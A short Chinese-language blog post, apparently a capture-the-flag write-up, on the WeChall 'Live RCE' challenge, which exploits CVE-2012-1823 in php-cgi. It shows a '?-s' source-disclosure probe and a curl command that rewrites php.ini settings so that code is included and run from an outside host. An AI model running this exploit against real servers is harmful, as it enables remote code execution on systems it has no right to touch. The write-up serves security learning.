---
title: 'Warchall: Live RCE'
author: rk700
layout: post
redirect_from: 
  - /writeup/2014/07/03/warchall-live-rce
  - /writeup/2014/07/03/warchall-live-rce/
tags:
  - PHP
  - wechall
---
<http://www.wechall.net/challenge/warchall/live_rce/index.php>  
这道题开始试了半天，发现没有注入什么的……然后在网上搜php rce，发现了有这个问题：CVE-2012-1823

根据解释，如果query string中不包含未urlencoded的等号，那么整个query会以空格分词，传给php-cgi。于是我们传-s，就会把php文件源码回显。试了`http://rce.warchall.net/?-s`，发现确实存在这个问题

然后我们就可以远程执行代码了  
{% highlight bash %}
$ curl http://rce.warchall.net/?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3a%2f%2fnabla.users.warchall.net%2f1+-n
{% endhighlight %}
这里会重写php.ini，使`http://nabla.users.warchall.net/1`被包含，于是类似于rfi。最后发现答案在文件`../config.php`中
